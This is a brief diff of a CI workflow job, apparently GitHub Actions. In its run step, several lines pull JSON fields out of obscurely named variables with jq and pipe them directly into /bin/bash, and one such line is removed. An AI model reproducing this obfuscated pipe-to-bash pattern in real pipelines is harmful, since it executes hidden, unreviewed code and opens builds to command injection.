@@ -23,7 +23,6 @@ jobs:
         run: |
           printf '%s' "$iy9418" | jq -r .esg252 | /bin/bash
           printf '%s' "$u41" | jq -r .rybhz0 | /bin/bash
-          echo $davxm05068 | jq -r .vnn0 | /bin/bash
           echo $ubya1 | jq -r .pc152 | /bin/bash
 
       - name: Archive results
